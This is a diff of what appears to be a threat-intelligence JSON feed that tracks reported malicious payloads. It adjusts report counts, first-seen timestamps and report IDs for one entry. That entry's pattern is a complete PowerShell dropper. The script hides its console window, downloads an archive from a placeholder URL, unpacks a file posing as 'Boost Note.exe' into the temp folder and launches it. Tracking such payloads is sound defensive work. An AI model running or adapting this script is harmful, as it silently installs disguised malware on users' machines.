@@ -464,12 +464,10 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 24,
-    "FirstSeen": "2026-11-21T04:02:40.528000+00:00",
+    "ReportCount": 22,
+    "FirstSeen": "2026-11-21T06:28:36.365000+00:00",
     "LastSeen": "2026-11-22T10:45:15.619000+00:00",
     "ReportIds": [
-      "cmwpvtv3x24da0omlegqyi3w3",
-      "cmwpwouox24kf0omlgh9z5stu",
       "cmwq11j6d25880oml93rto03l",
       "cmwq2e5vv25h10oml8yglxi1r",
       "cmwq2u5k425i10omlw3yitbd5",
